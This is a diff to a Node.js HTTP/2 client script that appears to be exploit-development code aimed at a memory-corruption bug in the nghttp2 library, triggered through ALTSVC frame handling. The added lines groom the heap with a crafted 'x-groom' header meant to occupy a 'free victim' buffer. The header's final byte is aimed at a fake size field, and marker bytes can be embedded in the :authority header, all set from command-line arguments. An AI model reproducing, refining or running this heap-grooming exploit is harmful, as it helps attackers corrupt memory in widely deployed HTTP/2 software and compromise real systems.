@@ -20,13 +20,31 @@ client.on('altsvc', (alt, origin, stream) => {
   hits++;
   console.log('ALTSVC-' + hits + ' origin_len=' + origin.length);
 });
-function send(tag, n) {
-  const req = client.request({ ':authority': 'a'.repeat(n), ':path': '/' + tag, ':method': 'GET' });
+// groomLen > 0 sends an extra x-groom header on request 1 only,
+// decoded AFTER :authority on the wire (object key order) — its
+// nghttp2 rcbuf is the candidate free victim (rung-4 step 3 lane).
+// groomTail < 0 → value all 'G' (measurement run); groomTail >= 0 →
+// value = 'G'*(len-1) + chr(groomTail): the LAST byte is destined for
+// the fake-sizefield low byte at V+believed+8.
+function send(tag, n, groomLen, groomTail, authTail) {
+  const auth = authTail === undefined
+    ? 'a'.repeat(n)
+    : 'a'.repeat(n - authTail.length) + authTail;
+  const headers = { ':authority': auth, ':path': '/' + tag, ':method': 'GET' };
+  if (groomLen > 0) {
+    headers['x-groom'] = groomTail >= 0
+      ? 'G'.repeat(groomLen - 1) + String.fromCharCode(groomTail)
+      : 'G'.repeat(groomLen);
+  }
+  const req = client.request(headers);
   req.resume();
   req.on('error', () => {});
 }
-send('r1', n1);
-setTimeout(() => send('r2', n2), delay);
+const gLen = Number(process.argv[6] || 0);
+const gTail = process.argv[7] === undefined ? -1 : Number(process.argv[7]);
+const a1Tail = process.argv[8]; // optional marker bytes ending authority_1
+send('r1', n1, gLen, gTail, a1Tail);
+setTimeout(() => send('r2', n2, 0, -1), delay + 0, undefined);
 setTimeout(() => {
   console.log('DONE hits=' + hits);
   process.exit(hits >= 2 ? 0 : 2);
